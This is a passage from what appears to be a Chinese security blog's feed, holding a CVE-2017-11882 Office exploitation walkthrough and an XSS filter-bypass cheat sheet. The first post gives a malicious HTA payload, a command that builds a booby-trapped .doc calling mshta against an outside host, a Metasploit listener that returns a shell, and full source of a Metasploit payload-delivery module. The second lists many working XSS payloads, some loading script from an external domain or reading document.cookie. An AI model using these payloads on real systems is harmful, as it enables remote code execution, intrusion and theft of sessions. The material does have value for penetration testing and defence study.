http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</div><div class="line">&lt;HEAD&gt; </div><div class="line">&lt;script language=&quot;VBScript&quot;&gt;</div><div class="line">Window.ReSizeTo 0, 0</div><div class="line">Window.moveTo -2000,-2000</div><div class="line">Set objShell = CreateObject(&quot;Wscript.Shell&quot;)</div><div class="line">objShell.Run &quot;calc.exe&quot;</div><div class="line">self.close</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;body&gt;</div><div class="line">demo</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/HEAD&gt; </div><div class="line">&lt;/HTML&gt;</div></pre></td></tr></table></figure><p>大概长这样<br><img src="//r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/E3VPexI*az4l2foBt5E5He496qZbQFK8PrrlB.ZZFlw!/r/dG4AAAAAAAAA" alt="2"></p><h4 id="4-将该文件上传到-var-www-html-目录下，并开启-apache-服务器"><a href="#4-将该文件上传到-var-www-html-目录下，并开启-apache-服务器" class="headerlink" title="4.将该文件上传到 /var/www/html/ 目录下，并开启 apache 服务器"></a>4.将该文件上传到 <code>/var/www/html/</code> 目录下，并开启 apache 服务器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service apache2 start</div></pre></td></tr></table></figure><h4 id="5-利用-exp-生成-doc"><a href="#5-利用-exp-生成-doc" class="headerlink" title="5.利用 exp 生成 doc"></a>5.利用 exp 生成 doc</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python Command_CVE-2017-11882.py -c &quot;mshta //192.168.9.172/abc&quot; -o test.doc</div></pre></td></tr></table></figure><h4 id="6-开启-msf-监听"><a href="#6-开启-msf-监听" class="headerlink" title="6.开启 msf 监听"></a>6.开启 msf 监听</h4><p><img src="//r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/LJpq7rg04pt97g9FtsCGynVyNs9H8grkIOZYDJmXImY!/r/dA0BAAAAAAAA" alt="3"></p><h4 id="7-打开-doc"><a href="#7-打开-doc" class="headerlink" title="7.打开 doc"></a>7.打开 doc</h4><p><img src="//r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/0MBrKpl.YtV09EHL8aG1WcIEXsow9pf4ujZSQeA7Y5k!/r/dN4AAAAAAAAA" alt="5"></p><h4 id="8-成功获得-shell"><a href="#8-成功获得-shell" class="headerlink" title="8.成功获得 shell"></a>8.成功获得 shell</h4><p><img src="//r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/eGvsprElZowK8KL0D2S1qd9VzAj6C.ExzbG7ytyyDWo!/r/dIUBAAAAAAAA" alt="4"></p><h2 id="0x03-参考文档"><a href="#0x03-参考文档" class="headerlink" title="0x03 参考文档"></a>0x03 参考文档</h2><p>//bobao.360.cn/learning/detail/4734.html</p><p><a href="https://github.com/Ridter/CVE-2017-11882" target="_blank" rel="external">https://github.com/Ridter/CVE-2017-11882</a></p><p><code>PS_shell.rb</code> 内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">##</div><div class="line"># This module requires Metasploit: https://metasploit.com/download</div><div class="line"># Current source: https://github.com/rapid7/metasploit-framework</div><div class="line">##</div><div class="line"></div><div class="line"></div><div class="line">class MetasploitModule  &lt; Msf::Exploit::Remote</div><div class="line">  Rank = NormalRanking</div><div class="line"></div><div class="line">  include Msf::Exploit::Remote::HttpServer</div><div class="line"></div><div class="line">  def initialize(info  = &#123;&#125;)</div><div class="line">    super(update_info(info,</div><div class="line">      &apos;Name&apos; =&gt; &apos;Microsoft Office Payload Delivery&apos;,</div><div class="line">      &apos;Description&apos; =&gt; %q&#123;</div><div class="line">        This module generates an command to place within</div><div class="line">        a word document, that when executed, will retrieve a HTA payload</div><div class="line">        via HTTP from an web server. Currently have not figured out how</div><div class="line">        to generate a doc.</div><div class="line">      &#125;,</div><div class="line">      &apos;License&apos; =&gt; MSF_LICENSE,</div><div class="line">      &apos;Arch&apos; =&gt; ARCH_X86,</div><div class="line">      &apos;Platform&apos; =&gt; &apos;win&apos;,</div><div class="line">      &apos;Targets&apos; =&gt;</div><div class="line">        [</div><div class="line">          [&apos;Automatic&apos;, &#123;&#125; ],</div><div class="line">        ],</div><div class="line">      &apos;DefaultTarget&apos; =&gt; 0,</div><div class="line">    ))</div><div class="line">  end</div><div class="line"></div><div class="line">  def on_request_uri(cli, _request)</div><div class="line">    print_status(&quot;Delivering payload&quot;)</div><div class="line">    p = regenerate_payload(cli)</div><div class="line">    data = Msf::Util::EXE.to_executable_fmt(</div><div class="line">      framework,</div><div class="line">      ARCH_X86,</div><div class="line">      &apos;win&apos;,</div><div class="line">      p.encoded,</div><div class="line">      &apos;hta-psh&apos;,</div><div class="line">      &#123; :arch =&gt; ARCH_X86, :platform =&gt; &apos;win &apos;&#125;</div><div class="line">    )</div><div class="line">    send_response(cli, data, &apos;Content-Type&apos; =&gt; &apos;application/hta&apos;)</div><div class="line">  end</div><div class="line"></div><div class="line"></div><div class="line">  def primer</div><div class="line">    url = get_uri</div><div class="line">    print_status(&quot;Place the following DDE in an MS document:&quot;)</div><div class="line">    print_line(&quot;mshta.exe \&quot;#&#123;url&#125;\&quot;&quot;)</div><div class="line">  end</div><div class="line">end</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer3&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer3&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;
&lt;h2 id=&quot;0x00背景&quot;&gt;&lt;a href=&quot;#0x00背景&quot; class=&quot;headerlink&quot; title=&quot;0x00背景&quot;&gt;&lt;/a&gt;0x00背景&lt;/h2&gt;&lt;p&gt;2017年11月，微软在例行系统补丁发布中，修复了一个Office远程代码执行的严重漏洞，编号CVE-2017-11882。该漏洞类型为缓冲区溢出，位为EQNEDT32.EXE组件。受害用户打开恶意的office文档时，无需交互，就可能执行恶意代码。&lt;/p&gt;
&lt;p&gt;据悉，这个组件是由Design Science Inc.开发的，后来由微软收购。该组件于2001年编译嵌入office，之后没有任何进一步的修改。所以该漏洞已存在17年之久。影响现阶段流行的所有office版本。&lt;br&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://damit5.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>XSS 绕过常用语句</title>
    <link href="https://damit5.com/2017/10/15/XSS-%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/"/>
    <id>https://damit5.com/2017/10/15/XSS-绕过常用语句/</id>
    <published>2017-10-15T06:29:27.000Z</published>
    <updated>2018-06-10T04:00:07.891Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h4 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面:::"></a>写在最前面:::</h4><p>下文中 <code>alert</code> 都可以由 <code>prompt</code> 代替</p><a id="more"></a><h2 id="最常用的-XSS-漏洞测试代码："><a href="#最常用的-XSS-漏洞测试代码：" class="headerlink" title="最常用的 XSS 漏洞测试代码："></a>最常用的 XSS 漏洞测试代码：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;prompt(&quot;XSS&quot;)&lt;/script&gt;</div><div class="line"></div><div class="line"></div><div class="line">&lt;SCRIPT SRC=http://damit5.ml/xss.js&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure><h2 id="在输入-Input-标签里"><a href="#在输入-Input-标签里" class="headerlink" title="在输入(Input)标签里"></a>在输入(Input)标签里</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;INPUT type=&quot;text&quot; value=&apos;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;&gt;</div></pre></td></tr></table></figure><h4 id="闭合-lt-input-gt"><a href="#闭合-lt-input-gt" class="headerlink" title="闭合&lt;input&gt;"></a>闭合<code>&lt;input&gt;</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure><p>现在我们的代码执行了。因为我们闭合了前面的 html 标签，就触发了 XSS，但是，你可能会发现，页面上会显示一个多出来的单引号，为什么，因为后面的那个原来的单引号没有匹配，我们继续修改我们的代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&lt;xss a=&apos;</div></pre></td></tr></table></figure></p><p>所有的输入就会变成这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;INPUT type=&quot;text&quot; value=&apos;&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&lt;xss a=&apos;&apos;&gt;</div></pre></td></tr></table></figure></p><p>Javascript 代码就注入了。<code>&lt;xss a=”&gt;</code>这个没什么意义，你可以自己改，但是符合 html 的标准，<br>页面不会出错。</p><h2 id="绕过单引号过滤"><a href="#绕过单引号过滤" class="headerlink" title="绕过单引号过滤"></a>绕过单引号过滤</h2><p>同样的例子，但是我们假设管理员在我们的单引号之前放置了一个“\”，有时候双引号之前也会放置，通<br>过一些类似 add_slashes 的函数可以实现，这个就是转义字符，我们先前的代码就会变成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;INPUT type=&quot;text&quot; value=&apos;\&apos;&gt;&lt;SCRIPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCRIPT&gt;&apos;&gt;</div></pre></td></tr></table></figure><p>有一些方法可以继续，但是要看过滤的那个函数是怎么放的了。其中一个方法就是使用字符实体，学过 html<br>的都知道，就是一些特殊字符会用一些固有的符号组合来表示，举个例子，你不能用&lt;&gt;表示大于和小于，<br>因为这被解释为 html 标签，但是，你如果要用，可以用下面的来代替。</p><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th></tr></thead><tbody><tr><td><code>&amp;#34;</code></td><td><code>&amp;quot;</code></td><td>“</td><td>双引号</td><td></td></tr><tr><td><code>&amp;#38;</code></td><td><code>&amp;amp;</code></td><td>&amp;</td><td>&amp;符号</td><td></td></tr><tr><td><code>&amp;#60;</code></td><td><code>&amp;lt;</code></td><td>&lt;</td><td>小于号</td><td></td></tr><tr><td><code>&amp;#62;</code></td><td><code>&amp;gt;</code></td><td>&gt;</td><td>大于号</td><td></td></tr></tbody></table><p>使用<code>&amp;quot;</code>或者<code>&amp;#34;</code><br>来代替我们的双引号，有时候可以绕过过滤。</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子:"></a>例子:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div><div class="line">&lt;script&gt;alert(&amp;quot;XSS&amp;quot;)&lt;/script&gt;</div><div class="line">&lt;script&gt;alert(&amp;#38;XSS&amp;#38;)&lt;/script&gt;</div></pre></td></tr></table></figure><p>如果这都被过滤了。那我们可以使用 JavaScript 的 <code>fromCharCode</code> 函数，这个函数把指定的 Unicode<br>值转换成字符串。</p><h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div><div class="line">&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</div></pre></td></tr></table></figure><h2 id="绕过-lt-SCRIPT-gt-过滤"><a href="#绕过-lt-SCRIPT-gt-过滤" class="headerlink" title="绕过 &lt;SCRIPT&gt;过滤"></a>绕过 <code>&lt;SCRIPT&gt;</code>过滤</h2><p>有些过滤器会过滤到<code>&lt;script&gt;</code>标签，那上面的例子就都废了，但是。还是有方法插入 javascript 的。我们看看事件处理器的例子。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BODY onload=&quot;alert(&apos;XSS&apos;)&quot;&gt;</div></pre></td></tr></table></figure></p><p>在 html 里啊。这个 Onload 关键字就是一个事件，其他的所有标签都没有这个属性，但是 Body 标签是有的。但是，有一定的局限性，如果 onload 事件在你的代码之前已经被处理了。那就不会触发了。。不过我们可以继续看看 onerror 事件处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;&quot; onerror=&quot;alert(&apos;XSS&apos;)&quot;&gt;</div><div class="line"></div><div class="line">&lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt;&lt;/img&gt;</div></pre></td></tr></table></figure><p>注意看，图片没有指定，也就是出错了。Onerror 这个事件就会发茶。引发 XSS 漏洞，没有用<code>&lt;script&gt;</code><br>标签哦。</p><h2 id="使用-IMG-源"><a href="#使用-IMG-源" class="headerlink" title="使用 IMG 源"></a>使用 IMG 源</h2><p>Html 中最常用的两个标签 <code>img</code> 和 <code>a href</code>一般是不会过滤的，一个指定图片，一个指定超链接。最危险的<br>是 <code>img</code> 标签</p><h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><h6 id="标准的样子："><a href="#标准的样子：" class="headerlink" title="标准的样子："></a>标准的样子：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><h6 id="没有双引号和分号"><a href="#没有双引号和分号" class="headerlink" title="没有双引号和分号:"></a>没有双引号和分号:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</div></pre></td></tr></table></figure><h6 id="不区分大小写的xss攻击向量"><a href="#不区分大小写的xss攻击向量" class="headerlink" title="不区分大小写的xss攻击向量"></a>不区分大小写的xss攻击向量</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;</div></pre></td></tr></table></figure><h6 id="过滤了双引号和-lt-script-gt"><a href="#过滤了双引号和-lt-script-gt" class="headerlink" title="过滤了双引号和 &lt;script&gt;:"></a>过滤了双引号和 <code>&lt;script&gt;</code>:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</div></pre></td></tr></table></figure><h6 id="使用-CharCode-绕过过滤"><a href="#使用-CharCode-绕过过滤" class="headerlink" title="使用 CharCode 绕过过滤:"></a>使用 CharCode 绕过过滤:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</div></pre></td></tr></table></figure><h6 id="有经验的攻击者也可以把上面的全部转换成相等的-Ascii-码"><a href="#有经验的攻击者也可以把上面的全部转换成相等的-Ascii-码" class="headerlink" title="有经验的攻击者也可以把上面的全部转换成相等的 Ascii 码:"></a>有经验的攻击者也可以把上面的全部转换成相等的 Ascii 码:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101; &amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</div></pre></td></tr></table></figure><h6 id="使用-Ascii-表你可以自己试试。当然转换成-16-进制也是可以的。。"><a href="#使用-Ascii-表你可以自己试试。当然转换成-16-进制也是可以的。。" class="headerlink" title="使用 Ascii 表你可以自己试试。当然转换成 16 进制也是可以的。。"></a>使用 Ascii 表你可以自己试试。当然转换成 16 进制也是可以的。。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp; #x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x58;&amp;#x53;&amp;#x53;&amp;#x27;&amp;#x29;&gt;</div></pre></td></tr></table></figure><h6 id="默认SRC属性去绕过SRC域名检测过滤器"><a href="#默认SRC属性去绕过SRC域名检测过滤器" class="headerlink" title="默认SRC属性去绕过SRC域名检测过滤器"></a>默认SRC属性去绕过SRC域名检测过滤器</h6><p>这将绕过绝大多数SRC域名过滤器。插入javascript代码在任何一个事件方法同样适用于热河一个HTML标签，例如Form、Iframe、Input、Embed等等。他将也允许任何任何该标签的相关事件去替换，例如onblur, onclick等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=# onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;</div></pre></td></tr></table></figure></p><h6 id="默认SRC属性通过省略它的值"><a href="#默认SRC属性通过省略它的值" class="headerlink" title="默认SRC属性通过省略它的值"></a>默认SRC属性通过省略它的值</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC= onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;</div></pre></td></tr></table></figure><h6 id="默认SRC属性通过完全不设置它"><a href="#默认SRC属性通过完全不设置它" class="headerlink" title="默认SRC属性通过完全不设置它"></a>默认SRC属性通过完全不设置它</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;</div></pre></td></tr></table></figure><h6 id="结尾没有分号的十六进制html编码引用"><a href="#结尾没有分号的十六进制html编码引用" class="headerlink" title="结尾没有分号的十六进制html编码引用"></a>结尾没有分号的十六进制html编码引用</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</div></pre></td></tr></table></figure><h2 id="使用制表符-换行符和回车符"><a href="#使用制表符-换行符和回车符" class="headerlink" title="使用制表符, 换行符和回车符"></a>使用制表符, 换行符和回车符</h2><h6 id="使用了最小的十六进制的制表符来欺骗过滤器"><a href="#使用了最小的十六进制的制表符来欺骗过滤器" class="headerlink" title="使用了最小的十六进制的制表符来欺骗过滤器"></a>使用了最小的十六进制的制表符来欺骗过滤器</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav&amp;#x9ascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><table><thead><tr><th>Type</th><th>Horizontal Tab</th><th>New line</th><th>Carriage Return</th></tr></thead><tbody><tr><td>URL</td><td><code>%09</code></td><td><code>%10</code></td><td><code>%13</code></td><td></td></tr><tr><td>Minimal Sized Hex</td><td><code>&amp;#x9</code></td><td><code>&amp;#xA</code></td><td><code>&amp;#xD</code></td></tr><tr><td>Maximum Sized Hex</td><td><code>&amp;#x0000009;</code></td><td><code>&amp;#x000000A;</code></td><td><code>&amp;#x000000D;</code></td></tr><tr><td>Minimum Sized Decimal</td><td><code>&amp;#9</code></td><td><code>&amp;#10</code></td><td><code>&amp;#13</code></td></tr><tr><td>Maximum Sized Decimal</td><td><code>&amp;#x0000009;</code></td><td><code>&amp;#x0000009;</code></td><td><code>&amp;#0000009;</code></td></tr></tbody></table><h2 id="使用空字符"><a href="#使用空字符" class="headerlink" title="使用空字符"></a>使用空字符</h2><p>另一个可以绕过的就是空字符，这是最有效的工具了。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCR%00IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure><p>空字符 (%00) 使得过滤器不能看到完整的 <code>&lt;SCRIPT&gt;</code> 标签. 只在 <strong>IE 6.0, IE 7.0</strong> 可以。</p><h2 id="双引号配对的bug"><a href="#双引号配对的bug" class="headerlink" title="双引号配对的bug"></a>双引号配对的bug</h2><p>绕过这种过滤就是寻找闭合的标签，然后构造来突破</p><h4 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;</div></pre></td></tr></table></figure><p>通常我们认为，img 标签里。前两个引号被认为是一对，什么都不做，下一个引号和最后的匹配，但是事<br>实不是这样，所有的浏览器都在试图修正这一问题。<br>结果最终如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&amp;gt;</div></pre></td></tr></table></figure></p><h2 id="不全面的过滤器"><a href="#不全面的过滤器" class="headerlink" title="不全面的过滤器"></a>不全面的过滤器</h2><p>我们看看当开发者已经把能想到的都过滤了或者什么的。就安全了吗？不。我们可以依然可以向数据指令里插入代码。我们通过 base64 加密<code>&lt;script&gt;alert(‘XSS’)&lt;/script&gt;.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot;</div><div class="line">CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;</div></pre></td></tr></table></figure><h2 id="畸形的A标签"><a href="#畸形的A标签" class="headerlink" title="畸形的A标签"></a>畸形的A标签</h2><p>跳过href属性，而直接获取xss实质攻击代码…提出被David Cross ~ 已验证在chrome浏览器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;</div></pre></td></tr></table></figure></p><p>此外，chrome浏览器喜欢去不全确实的引号为你。如果你遇到阻碍那么直接省略它们吧，chrome将会正确的帮你不全缺失的引号在URL和script中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;</div></pre></td></tr></table></figure></p><h2 id="使用双引号"><a href="#使用双引号" class="headerlink" title="使用双引号"></a>使用双引号</h2><h6 id="如果你需要使用双引号和单引号。使用一些诡异的用法吧-重音符混淆-。"><a href="#如果你需要使用双引号和单引号。使用一些诡异的用法吧-重音符混淆-。" class="headerlink" title="如果你需要使用双引号和单引号。使用一些诡异的用法吧 (重音符混淆)。"></a>如果你需要使用双引号和单引号。使用一些诡异的用法吧 (重音符混淆)。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=`javascript:alert(&quot;Look its, &apos;XSS&apos;&quot;)`&gt;</div></pre></td></tr></table></figure><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><h6 id="转义字符有时候很有用，可以对付一些简单的过滤器"><a href="#转义字符有时候很有用，可以对付一些简单的过滤器" class="headerlink" title="转义字符有时候很有用，可以对付一些简单的过滤器"></a>转义字符有时候很有用，可以对付一些简单的过滤器</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=`javascript:alert(\&quot;XSS\&quot;)`&gt;</div></pre></td></tr></table></figure><p>结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=`javascript:alert(\\&quot;XSS\\&quot;)`&gt;</div></pre></td></tr></table></figure><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><h4 id="使用-utf-7-编码可以绕过"><a href="#使用-utf-7-编码可以绕过" class="headerlink" title="使用 utf-7 编码可以绕过"></a>使用 utf-7 编码可以绕过</h4><h4 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div></pre></td></tr></table></figure><p>使用UTF-7编码后 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">+ADw-script+AD4-alert(+ACI-XSS+ACI-)+ADw-/script+AD4-</div></pre></td></tr></table></figure><p>然后所有的加号需要被改成%2b，否则会被浏览器识别为连接符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%2BADw-script%2BAD4-alert%281%29%2BADw-/script%2BAD4-</div></pre></td></tr></table></figure><h4 id="一个列表"><a href="#一个列表" class="headerlink" title="一个列表:"></a>一个列表:</h4><table><thead><tr><th>字符</th><th>实体引用</th></tr></thead><tbody><tr><td>空格</td><td>%20</td></tr><tr><td>/</td><td>%2F</td></tr><tr><td>“</td><td>%22</td></tr><tr><td>?</td><td>%3F</td></tr></tbody></table><h2 id="我也不知道咋分类了"><a href="#我也不知道咋分类了" class="headerlink" title="我也不知道咋分类了"></a>我也不知道咋分类了</h2><h4 id="内嵌TAB"><a href="#内嵌TAB" class="headerlink" title="内嵌TAB"></a>内嵌TAB</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav   ascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><h4 id="内嵌被编码的TAB"><a href="#内嵌被编码的TAB" class="headerlink" title="内嵌被编码的TAB"></a>内嵌被编码的TAB</h4><p>用来分开xss攻击代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure></p><h4 id="内嵌换行符去分开xss代码"><a href="#内嵌换行符去分开xss代码" class="headerlink" title="内嵌换行符去分开xss代码"></a>内嵌换行符去分开xss代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><h4 id="编码回车符去分开xss代码"><a href="#编码回车符去分开xss代码" class="headerlink" 